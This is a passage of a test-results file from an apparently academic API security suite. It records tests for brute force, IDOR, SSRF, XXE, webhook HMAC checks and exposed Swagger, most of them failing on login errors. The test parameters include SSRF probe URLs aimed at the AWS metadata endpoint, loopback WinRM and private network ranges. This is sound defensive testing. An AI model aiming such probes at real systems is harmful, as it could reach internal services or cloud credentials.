    <UnitTestResult executionId="e824033d-55a5-4490-a942-e8adaf5074aa" testId="b199ee88-0d65-797a-9fc9-2416c8db960c" testName="SecurityAsserts.Grupo1_ControlAcceso.G1_Auth_Asserts.A03_Auth_BruteForce_MultipleFailedLogins_ShouldReturn429Or401" computerName="YOURCOMPUTER" duration="00:00:00.0389060" startTime="2026-05-15T01:33:08.2038635-05:00" endTime="2026-05-15T01:33:08.2038636-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="e824033d-55a5-4490-a942-e8adaf5074aa" />
    <UnitTestResult executionId="06bbb6ed-0441-426b-bdbc-61e8e9d97871" testId="8b0b7602-fecb-8bb5-3bc1-f196ebcdf59e" testName="SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B01_Headers_XContentTypeOptions_ShouldBeNoSniff" computerName="YOURCOMPUTER" duration="00:00:00.0120369" startTime="2026-05-15T01:33:08.2620390-05:00" endTime="2026-05-15T01:33:08.2620390-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="06bbb6ed-0441-426b-bdbc-61e8e9d97871">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.GetAnyAuthenticatedResponse() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo2_Configuracion\G2_Headers_Asserts.cs:line 19&#xD;
   at SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B01_Headers_XContentTypeOptions_ShouldBeNoSniff() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo2_Configuracion\G2_Headers_Asserts.cs:line 31&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="fa08d6be-fbcc-4ca9-855d-966ad9fffcfc" testId="c9959b14-6237-60ea-3893-15c989d24ba5" testName="SecurityAsserts.Grupo1_ControlAcceso.G1_IDOR_Asserts.A21_IDOR_DeleteOtherUserOrder_ShouldReturn403Or404" computerName="YOURCOMPUTER" duration="00:00:00.0088987" startTime="2026-05-15T01:33:08.2592532-05:00" endTime="2026-05-15T01:33:08.2592534-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="fa08d6be-fbcc-4ca9-855d-966ad9fffcfc">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo1_ControlAcceso.G1_IDOR_Asserts.A21_IDOR_DeleteOtherUserOrder_ShouldReturn403Or404() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo1_ControlAcceso\G1_IDOR_Asserts.cs:line 79&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="2ef09bff-0aae-4640-a905-ddd2bd7c95be" testId="227725bf-c6a7-96c1-ff7c-2002669a654d" testName="SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: &quot;http://10.0.0.1/&quot;, description: &quot;RFC 1918 clase A&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.1242309" startTime="2026-05-15T01:33:08.2446021-05:00" endTime="2026-05-15T01:33:08.2446022-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2ef09bff-0aae-4640-a905-ddd2bd7c95be">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de admin@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(String callbackUrl, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo8_Webhooks\G8_WebhookSsrf_Asserts.cs:line 33&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="a2417e33-c281-41fa-8a7c-b1d9fc0b4d0c" testId="c3232f5e-cc8f-3302-d42d-6b7678c2f58e" testName="SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B05_Headers_XPoweredBy_ShouldNotBePresent" computerName="YOURCOMPUTER" duration="00:00:00.0066666" startTime="2026-05-15T01:33:08.2701339-05:00" endTime="2026-05-15T01:33:08.2701339-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="a2417e33-c281-41fa-8a7c-b1d9fc0b4d0c">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.GetAnyAuthenticatedResponse() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo2_Configuracion\G2_Headers_Asserts.cs:line 19&#xD;
   at SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B05_Headers_XPoweredBy_ShouldNotBePresent() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo2_Configuracion\G2_Headers_Asserts.cs:line 86&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="df787a22-2242-43e9-aa6b-6cad07b36439" testId="092e1184-2725-63f6-0388-22705b014520" testName="SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: &quot;http://192.168.1.1/admin&quot;, description: &quot;RFC 1918&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0111749" startTime="2026-05-15T01:33:08.2607242-05:00" endTime="2026-05-15T01:33:08.2607243-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="df787a22-2242-43e9-aa6b-6cad07b36439">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de admin@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(String callbackUrl, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo8_Webhooks\G8_WebhookSsrf_Asserts.cs:line 33&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="bb75b4f3-56fc-441c-9e2f-4663a9b9040f" testId="fd0563a5-1ce9-7538-ca1e-8ba5f6bb5640" testName="SecurityAsserts.Grupo7_Reportes.G7_XXE_Asserts.A22b_XXE_LocalFileEntity_ResponseShouldNotContainFileContent" computerName="YOURCOMPUTER" duration="00:00:00.0200848" startTime="2026-05-15T01:33:08.2516483-05:00" endTime="2026-05-15T01:33:08.2516484-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="bb75b4f3-56fc-441c-9e2f-4663a9b9040f">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo7_Reportes.G7_XXE_Asserts.A22b_XXE_LocalFileEntity_ResponseShouldNotContainFileContent() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo7_Reportes\G7_XXE_Asserts.cs:line 72&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="a1c66a08-c462-4eb8-b634-eb1a123f5451" testId="1dad61d7-df6c-dd31-79f1-8b6d0add5ddf" testName="SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: &quot;http://127.0.0.1:5985/wsman&quot;, description: &quot;loopback WinRM&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0217358" startTime="2026-05-15T01:33:08.2558580-05:00" endTime="2026-05-15T01:33:08.2558580-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="a1c66a08-c462-4eb8-b634-eb1a123f5451">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de admin@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(String callbackUrl, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo8_Webhooks\G8_WebhookSsrf_Asserts.cs:line 33&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="841795e5-cd20-475f-90cd-f92fcf8e12dd" testId="58cedddd-280e-65a6-7d2d-e9a8bb263696" testName="SecurityAsserts.Grupo2_Configuracion.G2_Misc_Asserts.B07_Swagger_ShouldNotBeAccessibleInProduction" computerName="YOURCOMPUTER" duration="00:00:00.0029181" startTime="2026-05-15T01:33:08.2632365-05:00" endTime="2026-05-15T01:33:08.2632365-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="841795e5-cd20-475f-90cd-f92fcf8e12dd">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.NotFound {value: 404} because B07 — Swagger NO debe estar expuesto en ambientes que no sean Development, but found HttpStatusCode.OK {value: 200}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo2_Configuracion.G2_Misc_Asserts.B07_Swagger_ShouldNotBeAccessibleInProduction() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo2_Configuracion\G2_Misc_Asserts.cs:line 35&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="9effb411-8001-4403-9160-8dba9080d0f0" testId="5a25c339-f75f-a5f4-5472-b9140fdc3073" testName="SecurityAsserts.Grupo3_Inyeccion.G3_HeaderInjection_Asserts.A24b_HeaderInjection_NormalQuery_ShouldWork" computerName="YOURCOMPUTER" duration="00:00:00.0028811" startTime="2026-05-15T01:33:08.2030129-05:00" endTime="2026-05-15T01:33:08.2030132-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="9effb411-8001-4403-9160-8dba9080d0f0" />
    <UnitTestResult executionId="edaeb710-7401-40cc-96e8-9af828f5a956" testId="83834dcd-35aa-0e3d-2c7a-00e756dca284" testName="SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(url: &quot;http://192.168.1.1/&quot;, description: &quot;RFC 1918&quot;)" computerName="YOURCOMPUTER" duration="00:00:02.0390172" startTime="2026-05-15T01:33:19.3270961-05:00" endTime="2026-05-15T01:33:19.3270963-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="edaeb710-7401-40cc-96e8-9af828f5a956">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be one of {HttpStatusCode.BadRequest {value: 400}, HttpStatusCode.Forbidden {value: 403}} because A15 — SSRF: URL a RFC 1918 ('http://192.168.1.1/') debe rechazarse con 400/403, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.BeOneOf(IEnumerable`1 validValues, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(String url, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo5_Servidor\G5_SSRF_Asserts.cs:line 45&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="6ff37963-f0e4-4267-9a92-1a272ecf24ec" testId="b79d21eb-6e23-c1bf-059b-787ee51971ba" testName="SecurityAsserts.Grupo8_Webhooks.G8_WebhookHmac_Asserts.A26b_Webhook_WithInvalidHmacSignature_ShouldReturn401" computerName="YOURCOMPUTER" duration="00:00:00.0174084" startTime="2026-05-15T01:33:08.2477370-05:00" endTime="2026-05-15T01:33:08.2477372-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="6ff37963-f0e4-4267-9a92-1a272ecf24ec">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be one of {HttpStatusCode.Unauthorized {value: 401}, HttpStatusCode.Forbidden {value: 403}} because A26b — Webhook con HMAC falso: una firma incorrecta debe retornar 401/403, but found HttpStatusCode.OK {value: 200}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.BeOneOf(IEnumerable`1 validValues, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo8_Webhooks.G8_WebhookHmac_Asserts.A26b_Webhook_WithInvalidHmacSignature_ShouldReturn401() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo8_Webhooks\G8_WebhookHmac_Asserts.cs:line 60&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="d018e558-d722-482a-b964-76edbfdd1bc4" testId="3b67c3d7-a329-6885-8c3b-be9e2d1e5ddc" testName="SecurityAsserts.Grupo6_Archivos.G6_ReDoS_Asserts.A25b_ReDoS_InvalidPattern_ShouldReturn400NotCrash" computerName="YOURCOMPUTER" duration="00:00:00.0044037" startTime="2026-05-15T01:33:08.1950400-05:00" endTime="2026-05-15T01:33:08.1950400-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="d018e558-d722-482a-b964-76edbfdd1bc4" />
    <UnitTestResult executionId="fc8c03c8-930a-4e8c-9463-5de0e25409b7" testId="9c432baf-c5cb-7a98-9887-537fdd066ceb" testName="SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15c_SSRF_ResponseShouldNotContainInternalNetworkData" computerName="YOURCOMPUTER" duration="00:00:02.0812134" startTime="2026-05-15T01:33:10.1757196-05:00" endTime="2026-05-15T01:33:10.1757198-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="fc8c03c8-930a-4e8c-9463-5de0e25409b7" />
    <UnitTestResult executionId="66be7c26-8218-459a-98fa-4e8183972fe5" testId="de57abef-0a03-db53-7b26-8e8caab6405f" testName="SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: &quot;http://169.254.169.254/latest/meta-data/&quot;, description: &quot;AWS metadata&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0055082" startTime="2026-05-15T01:33:08.2683673-05:00" endTime="2026-05-15T01:33:08.2683674-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="66be7c26-8218-459a-98fa-4e8183972fe5">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de admin@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(String callbackUrl, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo8_Webhooks\G8_WebhookSsrf_Asserts.cs:line 33&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="6111321e-61dc-4629-b8e0-d0e9148667f0" testId="998e0da3-654c-112a-2eb9-c1b43ef8bf28" testName="SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(url: &quot;http://169.254.169.254/latest/&quot;, description: &quot;AWS metadata&quot;)" computerName="YOURCOMPUTER" duration="00:00:05.0069491" startTime="2026-05-15T01:33:15.2308881-05:00" endTime="2026-05-15T01:33:15.2308884-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="6111321e-61dc-4629-b8e0-d0e9148667f0">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be one of {HttpStatusCode.BadRequest {value: 400}, HttpStatusCode.Forbidden {value: 403}} because A15 — SSRF: URL a AWS metadata ('http://169.254.169.254/latest/') debe rechazarse con 400/403, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.BeOneOf(IEnumerable`1 validValues, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(String url, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo5_Servidor\G5_SSRF_Asserts.cs:line 45&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="83851c1f-1f14-4bbc-948e-bdffe0dac248" testId="5b1c7b67-7773-d380-fea2-4243e16ef3f0" testName="SecurityAsserts.Grupo8_Webhooks.G8_WebhookHmac_Asserts.A26c_Webhook_ResponseShouldNotEchoPayloadBack" computerName="YOURCOMPUTER" duration="00:00:00.0649912" startTime="2026-05-15T01:33:08.1663937-05:00" endTime="2026-05-15T01:33:08.1663938-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="83851c1f-1f14-4bbc-948e-bdffe0dac248" />
    <UnitTestResult executionId="2b7f06ea-b67d-4365-8f88-73c201953e21" testId="ef2d807e-2db8-5c9b-0078-b95583ba733b" testName="SecurityAsserts.Grupo2_Configuracion.G2_InputLimits_Asserts.B11_ContentType_LoginWithWrongContentType_ShouldReturn415" computerName="YOURCOMPUTER" duration="00:00:00.0172212" startTime="2026-05-15T01:33:08.2473237-05:00" endTime="2026-05-15T01:33:08.2473237-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2b7f06ea-b67d-4365-8f88-73c201953e21" />
    <UnitTestResult executionId="4d82c1bf-b14f-4997-9003-2cb039d1dc4b" testId="b903db74-d401-825c-2d4b-b2638e7eb823" testName="SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16_DebugInfo_WithoutAuth_ShouldReturn401Or404" computerName="YOURCOMPUTER" duration="00:00:00.0064907" startTime="2026-05-15T01:33:08.2574014-05:00" endTime="2026-05-15T01:33:08.2574017-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="4d82c1bf-b14f-4997-9003-2cb039d1dc4b">
